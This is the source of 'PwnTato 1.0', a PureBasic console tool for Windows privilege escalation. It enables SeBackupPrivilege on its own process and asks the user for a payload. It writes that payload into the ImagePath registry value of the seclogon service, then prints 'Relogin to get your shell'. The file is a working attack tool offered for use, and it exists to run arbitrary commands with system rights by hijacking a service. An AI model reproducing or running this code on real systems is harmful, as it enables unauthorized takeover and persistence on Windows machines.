; WinIoCtl.h
;

#FILE_DEVICE_FILE_SYSTEM         = $00000009
#METHOD_BUFFERED                 = 0
#FILE_ANY_ACCESS                 = 0
#FILE_SPECIAL_ACCESS             = (#FILE_ANY_ACCESS)

; Define a macro to create custom control codes for IO operations
Macro CTL_CODE( DeviceType, Function, Method, Access )
  (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
EndMacro

; Define control codes for manipulating reparse points in the file system
#FSCTL_SET_REPARSE_POINT         = CTL_CODE(#FILE_DEVICE_FILE_SYSTEM, 41, #METHOD_BUFFERED, #FILE_SPECIAL_ACCESS)
#FSCTL_GET_REPARSE_POINT         = CTL_CODE(#FILE_DEVICE_FILE_SYSTEM, 42, #METHOD_BUFFERED, #FILE_ANY_ACCESS)
#FSCTL_DELETE_REPARSE_POINT      = CTL_CODE(#FILE_DEVICE_FILE_SYSTEM, 43, #METHOD_BUFFERED, #FILE_SPECIAL_ACCESS)

; Winbase.h
;
#FILE_FLAG_OPEN_REPARSE_POINT    = $00200000

; WinNT.h
;
#IO_REPARSE_TAG_MOUNT_POINT  = $A0000003       
#IO_REPARSE_TAG_HSM          = $C0000004       
#IO_REPARSE_TAG_HSM2         = $80000006       
#IO_REPARSE_TAG_SIS          = $80000007       
#IO_REPARSE_TAG_DFS          = $8000000A       
#IO_REPARSE_TAG_SYMLINK      = $A000000C       
#IO_REPARSE_TAG_DFSR         = $80000012

; Define structures related to reparse points
Structure SymbolicLinkReparseBuffer
  SubstituteNameOffset.w
  SubstituteNameLength.w
  PrintNameOffset.w
  PrintNameLength.w
  Flags.l
  PathBuffer.w[1]
EndStructure

Structure MountPointReparseBuffer
  SubstituteNameOffset.w
  SubstituteNameLength.w
  PrintNameOffset.w
  PrintNameLength.w
  PathBuffer.w[1]
EndStructure

Structure GenericReparseBuffer
  DataBuffer.b[1]
EndStructure

Structure REPARSE_DATA_BUFFER
  ReparseTag.l
  ReparseDataLength.w
  Reserved.w
  StructureUnion
    SymbolicLinkReparseBuffer.SymbolicLinkReparseBuffer
    MountPointReparseBuffer.MountPointReparseBuffer
    GenericReparseBuffer.GenericReparseBuffer
  EndStructureUnion
EndStructure

; Procedure to enable the SeBackupPrivilege token privilege
Procedure Set_SeBackupPrivilege()
  Protected TokenHandle, BufferSize, hDirectory, BytesReturned.l
  Protected Privileges.TOKEN_PRIVILEGES
  Protected *Buffer.REPARSE_DATA_BUFFER
  Protected Result$ = ""

  If OpenProcessToken_(GetCurrentProcess_(), #TOKEN_ADJUST_PRIVILEGES, @TokenHandle)
    Privileges\PrivilegeCount = 1
    Privileges\Privileges[0]\Attributes = #SE_PRIVILEGE_ENABLED
   
    If LookupPrivilegeValue_(#Null, @"SeBackupPrivilege", @Privileges\Privileges[0]\Luid)       
      AdjustTokenPrivileges_(TokenHandle, #False, @Privileges, SizeOf(TOKEN_PRIVILEGES), #Null, #Null)
    EndIf   
    CloseHandle_(TokenHandle)
  EndIf
EndProcedure

; Procedure to write a registry key
Procedure.l WriteRegKey(OpenKey.l, SubKey.s, KeySet.s, KeyValue.s)
  hKey.l = 0 
  If RegCreateKey_(OpenKey, SubKey, @hKey) = 0
    Result = 1
    Datasize.l = Len(KeyValue)
    If RegSetValueEx_(hKey, KeySet, 0, #REG_EXPAND_SZ, @KeyValue, Datasize) = 0
      Result = 2
    EndIf
    RegCloseKey_(hKey)
  EndIf
  ProcedureReturn Result
EndProcedure

; Procedure to read a registry key
Procedure.s ReadRegKey(OpenKey.l, SubKey.s, ValueName.s)
  hKey.l = 0
  KeyValue.s = Space(255)
  Datasize.l = 255
  If RegOpenKeyEx_(OpenKey, SubKey, 0, #KEY_READ, @hKey)
    KeyValue = "Error Opening Key"
  Else
    If RegQueryValueEx_(hKey, ValueName, 0, 0, @KeyValue, @Datasize)
      KeyValue = "Error Reading Key"
    Else 
      KeyValue = Left(KeyValue, Datasize - 1)
    EndIf
    RegCloseKey_(hKey)
  EndIf
  ProcedureReturn KeyValue
EndProcedure 

Procedure success()
  ConsoleColor(10, 0)
  Print("[+] ")
  ConsoleColor(7,0)
EndProcedure

Procedure fail()
  ConsoleColor(12, 0)
  Print("[-] ")
  ConsoleColor(7,0)
EndProcedure

Procedure warn()
  ConsoleColor(6, 0)
  Print("[!] ")
  ConsoleColor(7,0)
EndProcedure

Procedure check()
  ConsoleColor(13, 0)
  Print("[*] ")
  ConsoleColor(7,0)
EndProcedure

; Main execution starts here
;Debug ReadRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath") 
OpenConsole()
ConsoleTitle("PwnTato 1.0")
EnableGraphicalConsole(0)
ClearConsole()
; header section

duty$ = #CRLF$ + #CRLF$ + #TAB$ + "      ██      ██  ██        "+#CRLF$
duty$ = duty$ + #TAB$ + "    ██  ██  ██  ██  ██  ██████  "+#CRLF$
duty$ = duty$ + #TAB$ + "  ██  ██  ████  ██    ██    ██  "+#CRLF$
duty$ = duty$ + #TAB$ + "██      ██  ██    ██  ██    ██  "+#CRLF$
duty$ = duty$ + #TAB$ + "  ████  ██    ██    ██    ██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ████  ██    ██  ██  ████"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒████████████████▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒████▒▒▒▒▒▒▒▒████▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██"+#CRLF$
duty$ = duty$ + #TAB$ + "    ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████"+#CRLF$
duty$ = duty$ + #TAB$ + "      ████████████████████  "+#CRLF$
duty$ = duty$ 

ver$ =  #TAB$ + "              v1.0"

solg$ =  #TAB$ + "       PwnTato by "
ConsoleColor(14, 0)
Print(duty$)
ConsoleColor(10, 0)
PrintN(ver$)
ConsoleColor(14, 0)
Print(solg$)
ConsoleColor(12, 0)
PrintN("@duty1g"+#CRLF$+#CRLF$)
ConsoleColor(7, 0)
;EnableGraphicalConsole(0)


Set_SeBackupPrivilege()
success()
Print("SeBackupPrivilege token injected to the process "+#CRLF$)
warn()
Print("Enter your seclogon payload: ")
payload$ = Input()

WriteRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath", payload$)
check()
Print("Checking written key : "+#CRLF$)

If ReadRegKey(#HKEY_LOCAL_MACHINE, "SYSTEM\CurrentControlSet\Services\seclogon", "ImagePath") = payload$
    success()
    Print("Done :) "+#CRLF$)
    warn()
    Print("Relogin to get your shell "+#CRLF$)
  Else
    fail()
    Print("Something bad happens"+#CRLF$)
EndIf 

CloseConsole()

; IDE Options = PureBasic 4.60 (Windows - x86)
; ExecutableFormat = Console
; CursorPosition = 33
; Folding = --
; EnableUnicode
; EnableXP
; Executable = read.exe